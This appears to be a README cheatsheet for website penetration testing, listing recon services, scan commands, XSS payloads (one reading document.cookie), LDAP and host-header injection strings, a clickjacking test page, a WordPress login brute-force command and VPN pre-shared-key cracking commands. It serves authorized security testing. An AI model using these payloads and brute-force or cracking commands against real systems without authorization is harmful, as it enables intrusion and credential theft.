<!-- PROJECT LOGO -->
<br />
<p align="center">
    <img src="/img/hood.jpg" alt="Logo" width="400" height="350">

  <h3 align="center">Website Pentesting Cheatsheet</h3>

</p>


<b>Table of Contents</b>

- [Passive Recon](#passiverecon)
  * [Bing](#bing)
  * [Censys](#censys)
  * [DnsDumpster](#dnsdumpster)
  * [FindSubdomains](#findsubdomains)
  * [ViewDNSinfo](#viewdnsinfo)
  * [TheHarvester](#theharvester)
  * [ArchiveOrg](#archiveorg)
  * [OSINT](#osint)


- [Initial scans](#initialscans)
  * [Nmap](#nmap)
  * [Sslscan](#sslscan)
  * [Testssl](#testssl)
  * [QualysSSL](#qualysSSL)
  * [SecurityHeaders](#securityheaders)

- [Website Audit](#pentesting)
  * [Nikto](#nikto)
  * [Dirbusting](#dirbusting)
  * [Burp](#burpsuite)
  * [XSS](#xss)
  * [XXE](#xxe)
  * [SQL injection](#sqlinjection)
  * [CSRF](#csrf)
  * [SSRF](#ssrf)
  * [Directory Traversal](#directorytraversal)
  * [LFI](#localfileinclusion)
  * [Clickjacking](#clickjacking)
  * [Session fixation](#sessionfixation)
  * [Java Platform](#javaplatform)
  * [LDAP injection](#ldapinjection)
  * [CMS](#cms)
  
  
- [Misc - Other tests](#misc)
  * [Host Header Injection](#hostheaderinjection)
  * [Web Cache Poisoning](#webcachepoisoning)
  * [Open Redirect](#openredirect)
  * [WAF](#wafwoof)
  * [VPN](#vpn)
  * [API](#api)
 





---

<a name="passiverecon"></a><h2> Passive Recon </h2>

<a name="bing"></a><h3>Bing</h3>
- Bing ->   ip:79.98.28.23

<a name="censys"></a><h3>Censys</h3>
- https://censys.io/

<a name="dnsdumpster"></a><h3>DnsDumpster</h3>
- https://dnsdumpster.com/

<a name="findsubdomains"></a><h3>FindSubdomains</h3>
- https://findsubdomains.com/

<a name="viewdnsinfo"></a><h3>View DNS Info</h3>
- https://viewdns.info/

<a name="theharvester"></a><h3>TheHarvester</h3>
```sh
 theharvester -d example.com -b all
```
<a name="archiveorg"></a><h3>ArchiveOrg</h3>
```sh
 curl -s "http://web.archive.org/cdx/search/cdx?url=something.example.com/*&output=text&fl=original&collapse=urlkey"
```
<a name="osint"></a><h3>OSINT</h3>
```
https://ginseg.com/2018/1416/congresos-cons/taller-sobre-ciberinteligencia-en-honeycon2018/
```

<a name="initialscans"></a><h2> Initial Scans </h2>

<a name="nmap"></a><h3>Nmap</h3>
```sh
- TCP: sudo nmap -sC -sV -vv -p- 10.10.10.120  -T5
- UDP: sudo nmap -sU -sV -vv -oA quick_udp 10.10.10.10
```
<a name="sslscan"></a><h3>Sslscan</h3>
```sh
 sslscan www.example.com
```
<a name="testssl"></a><h3>Testssl</h3>
```sh
 testssl www.example.com
```
<a name="qualysSSL"></a><h3>Qualys SSL Labs</h3>
- https://www.ssllabs.com/ssltest/

<a name="securityheaders"></a><h3>Security Headers</h3>
- https://securityheaders.com/



<a name="pentesting"></a><h2> Website Audit </h2>

<a name="nikto"></a><h3>Nikto</h3>
```sh
 nikto -h www.example.com
```

<a name="dirbusting"></a><h3>Dirbusting</h3>

- Wfuzz
```sh
 wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://IP:PORT/FUZZ
```

- GoBuster
```sh
gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php
```

- IIS Scanner
```
https://github.com/irsdl/IIS-ShortName-Scanner
```

<a name="burpsuite"></a><h3>Burp Suite Professional</h3>

- Burpsuite pro
  - Recommended Extensions
    - .NET Beautifier
    - Active Scan++
    - Additional CSRF Checks
    - Additional Scanner Checks
    - Backslash Powered Scanner
    - CMS Scanner
    - Collaborator Everywhere
    - Command Injection Attacker
    - Content Type Converter
    - CSP Auditor
    - CSRF Scanner
    - Error Message Checks
    - Freddy, Deserialization Bug Finder
    - HTML5 Auditor
    - J2EEScan
    - Java Deserialization Bug Finder
    - JSON Beautifier
    - NGINX Alias Traversal
    - PHP Object Injection Check
    - Retire.js
    - Software version Reporter
    - Software Vulnerability Scanner

<a name="xss"></a><h3>XSS</h3>
```js
<svg onload=alert('XSS')
"><script>alert(1)</script>
<script>alert(document.cookie);</script>
<script>alert(1)</script>
<script>alert("hello")</script>
<a onmouseover="alert(13)">xxs link</a>
<img src="a.jpg" onerror="javascript:alert(1)"/>
' onerror='alert(1)';
javascript:alert(1)
<body onload=alert("XSS")>
<img src=x onError=alert('xss')>
"><img src onerror=alert(1)> 
"autofocus onfocus=alert(1)// 
</script><script>alert(1)</script> 
'-alert(1)-' 
\'-alert(1)//



 1. " for ' and vice versa according to where injection lands 
 1. alert(1) for (confirm)(1) or confirm`1` 
 2. // for <!-- 
 3. spaces for / or %0A, %0C or %0D.


```

```sh
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
```

```
https://github.com/s0md3v/XSStrike
```

<a name="xxe"></a><h3>XXE</h3>
```
https://backtrackacademy.com/articulo/explorando-la-vulnerabilidad-xxe-xml-external-entity
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
```

<a name="sqlinjection"></a><h3>SQL Injection</h3>
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

<a name="csrf"></a><h3>CSRF</h3>
```
Example:  Do a petition with burp (logged in) , like adding a comment, send that petition to repeater and right click
'Engagement tools' > 'generate CSRF POC' , copy the link and open it. Then drop the petition you where going to do and log out.
Then in the link burp generated for you click "submit", log in again and check if the petition was made.
```

```
https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-
```

<a name="ssrf"></a><h3>SSRF</h3>
```
https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
```

<a name="directorytraversal"></a><h3>Directory Traversal</h3>
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
```

<a name="localfileinclusion"></a><h3>LFI</h3>
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```

```
https://github.com/P0cL4bs/Kadimus
```

<a name="clickjacking"></a><h3>Clickjacking</h3>
```html
<html>
	<head>
		<title>Clickjack test page</title>
	</head>
	<body>
		<p>Website is vulnerable to clickjacking!</p>
		<iframe src="https://domain_to_test/" width="500" height="500"></iframe>
	</body>
</html
```

<a name="sessionfixation"></a><h3>Session Fixation</h3>
```
Example: Log in into the web app , do a petition and send it to repeater. Now log out. Return back to repeater and finish the petition.
If the petition is made we have session fixation because the identifier doesn't get destroyed when the user log out. 
```

<a name="javaplatform"></a><h3>Java Platform</h3>

- https://github.com/joaomatosf/jexboss

```sh
python jexboss.py -u https://domain/index.action
```
<a name="javaplatform"></a><h3>Padding Oracle</h3>

- https://github.com/GDSSecurity/PadBuster

- https://github.com/mwielgoszewski/python-paddingoracle

<a name="ldapinjection"></a><h3>LDAP injection</h3>
```
-->  example.php?name=hacker&password=hacker
    
    Inversed querys give different results
--> example.php?name=*)(objectClass=*&password=hacker

--> example.php?name=*)(!(objectClass=*)&password=hacker
```

<a name="cms"></a><h3>CMS</h3>
- Wordpress
```
# Scan plugins and users
wpscan --url http://ip/wp/ -eu
```
```
# Bruteforce login
wpscan --url IP -U 'admin ' -P /usr/share/wordlists/rockyou.txt --max-threads 50
```

- Joomla
```
https://github.com/drego85/JoomlaScan
```
```
python joomlascan.py -u URL
```

- Drupal
```
https://github.com/droope/droopescan
```
```
./droopescan scan drupal -u http://example.org/ -t 32
```

- CMSmap
```
https://github.com/Dionach/CMSmap
```


<a name="misc"></a><h2> Misc - Other Tests </h2>
<a name="hostheaderinjection"></a><h3>Host header injection</h3>
```
Host: example.com -> Host: microsoft.com
```
```
Different web server behaves differently for duplicate http host header, NGINXuses last host header to identify the request, Apache/IIS concatenates.

Host: example.com
Host: microsoft.com
```
```
Host: example.com
X-Forwarded-Host: microsoft.com
```

<a name="webcachepoisoning"></a><h3>Web Cache Poisoning</h3>

```
https://portswigger.net/blog/practical-web-cache-poisoning
```


<a name="openredirect"></a><h3>Open Redirect</h3>

```
https://s0cket7.com/open-redirect-vulnerability/
```


<a name="wafwoof"></a><h3>wafw00f</h3>

```
wafw00f https://example.com
```


<a name="vpn"></a><h3>VPN</h3>

```
#  -M : Tabbed output    
#  -A : Aggressive mode    
#  -P<filename> : Filename to write to the pre-shared key   
#  -d : Destination UDP port

ike-scan -M -A IP -d 500 --id=blop -Pkey

# Crack key
psk-crack -d /usr/share/wordlists/rockyou.txt key
```


<a name="api"></a><h3>API</h3>

```
# JSON API, try to inject xml to archive XXE
https://blog.netspi.com/playing-content-type-xxe-json-endpoints/
```





